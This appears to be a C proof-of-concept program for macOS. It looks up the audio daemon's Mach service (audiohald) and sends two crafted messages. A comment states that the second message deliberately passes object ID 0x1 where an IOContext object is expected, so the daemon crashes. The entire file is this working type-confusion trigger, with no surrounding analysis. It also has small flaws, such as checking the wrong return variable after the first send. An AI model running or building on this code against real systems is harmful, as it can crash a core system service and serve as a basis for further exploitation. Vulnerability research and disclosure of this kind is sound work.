#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <launch.h>
#include <string.h>
#include <servers/bootstrap.h>
#include <mach/vm_map.h>

#define XSYSTEM_OPEN_MSG_SIZE 0x38
#define XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE 0x24

typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_port_descriptor_t descriptor[1];
    char body[];
} xsystemopen_mach_message;

typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;
} xworkgroup_mach_message;

mach_port_t create_mach_port_with_send_and_receive_rights() {
    mach_port_t port;
    kern_return_t kr;

    // Allocate a port with receive rights
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate port: %s\n", mach_error_string(kr));
        exit(1);
    }

    // Insert a send right for the port
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to insert send right: %s\n", mach_error_string(kr));
        exit(1);
    }

    return port; // Return the port with send rights
}

int main(int argc, char *argv[]) {
    printf("Getting started...\n");

    int opt;
    char *service_name = "com.apple.audio.audiohald";
    mach_port_t destination_port = MACH_PORT_NULL;

    mach_port_t bootstrap_port;
    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get bootstrap port, error: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("Got Bootstrap port! %d\n", bootstrap_port);

    kr = bootstrap_look_up(bootstrap_port, service_name, &destination_port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap lookup failed, error: %s\n", mach_error_string(kr));
        return 1;
    }
    printf("Got service port! %d\n", destination_port);

    mach_msg_return_t result;

    // Send _XSystem_Open message to initialize client
    xsystemopen_mach_message *xsystemopen_msg = malloc(XSYSTEM_OPEN_MSG_SIZE);

    mach_port_t reply_port;
    // Set up the memory for descriptor
    mach_port_t send_right_port = create_mach_port_with_send_and_receive_rights();

    xsystemopen_msg->msgh_descriptor_count = 1;
    xsystemopen_msg->descriptor[0].name = send_right_port;
    xsystemopen_msg->descriptor[0].disposition = MACH_MSG_TYPE_MOVE_SEND;
    xsystemopen_msg->descriptor[0].type = MACH_MSG_PORT_DESCRIPTOR;

    xsystemopen_msg->header.msgh_remote_port = destination_port;
    xsystemopen_msg->header.msgh_voucher_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_id = 1010000;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Error allocating reply port: %s\n", mach_error_string(kr));
        return kr;
    }

    xsystemopen_msg->header.msgh_local_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);

    result = mach_msg(
        &xsystemopen_msg->header,  // Pointer to the message header
        MACH_SEND_MSG,  // Send the message and then receive a reply in one call
        XSYSTEM_OPEN_MSG_SIZE,  // Send size
        0,  // Receive buffer size (larger than send size)
        send_right_port,  // Local port to receive the reply
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL 
    );

    free(xsystemopen_msg);

    fprintf(stderr, "Sent Mach message: %s\n", mach_error_string(kr));

    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Error sending Mach message: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("XSystem_Open stage complete.\n");

    xworkgroup_mach_message *workgroup_msg = malloc(XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE);
    
    workgroup_msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_PORT_NULL, MACH_PORT_NULL, MACH_PORT_NULL);
    workgroup_msg->header.msgh_size = XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE;
    workgroup_msg->header.msgh_remote_port = destination_port;
    workgroup_msg->header.msgh_local_port = MACH_PORT_NULL;
    workgroup_msg->header.msgh_id = 1010059;
    
    // Arbitrary object ID (0x1 this will retrieve the HAL System type, it's expecting an IOContext type, so it will crash)
    workgroup_msg->object_id = 0x1;

    result = mach_msg(
        &workgroup_msg->header,  // Pointer to the message header
        MACH_SEND_MSG,  // Just send the message
        XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE,  // Send size
        0, // Don't need to receive this message
        MACH_PORT_NULL, // Don't need to receive this message
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL
    );

    if (result != KERN_SUCCESS) {
        fprintf(stderr, "Error in mach_msg send and receive: %s\n", mach_error_string(result));
        free(workgroup_msg);
        return 1;
    }

    free(workgroup_msg);

    printf("XIOContext_Fetch_Workgroup_Port mach message processed successfully.\n");

    return 0;
}
